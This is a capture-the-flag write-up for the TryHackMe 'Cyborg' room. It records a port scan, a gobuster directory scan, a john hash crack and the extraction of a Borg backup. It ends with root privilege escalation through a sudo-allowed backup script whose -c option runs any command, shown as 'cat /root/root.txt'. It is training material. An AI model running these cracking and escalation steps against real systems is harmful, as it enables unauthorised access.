# Link
- https://tryhackme.com/room/cyborgt8

# Info
## IP = $IP

## creds
- music_archive:squidward
- alex:S3cretP@s3

# Ports

## Port Scanning

```
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
2008/tcp filtered conf
3128/tcp closed squid-http
```

## 80

### `gobuster`

```
/admin                (Status: 301) [Size: 314] [--> http://$IP/admin/]                                                                         
/etc                  (Status: 301) [Size: 312] [--> http://$IP/etc/]                                                                           
/index.html           (Status: 200) [Size: 11321]
```

### _/admin_

### _/etc_

- /squid/passwd
- /squid/squid.conf

### john
```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/Cyborg]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
squidward        (music_archive) 
```

### _tar_  the file gotten in the site

### checking _README_ file

```
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

### using _borg_ to get the alex home directory

```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/Cyborg]
└─$ borg extract ~/Desktop/CTFs/tryhackme/Cyborg/home/field/dev/final_archive::music_archive

Enter passphrase for key /home/kali/Desktop/CTFs/tryhackme/Cyborg/home/field/dev/final_archive:
```

### checking _Documents_ folder, the credentials appear

## 22

### using _alex_ creds


# PrivEsc

### checking _user.txt_

- `flag{XXXX}`

### `sudo -l`

```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

### the file has the following part:

```
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done
```

### so, if I use the parameter _-c_, I can execute any command as root:

```
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh  -c "cat /root/root.txt"
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
find: ‘/run/user/108/gvfs’: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
$IP{XXXX}
```



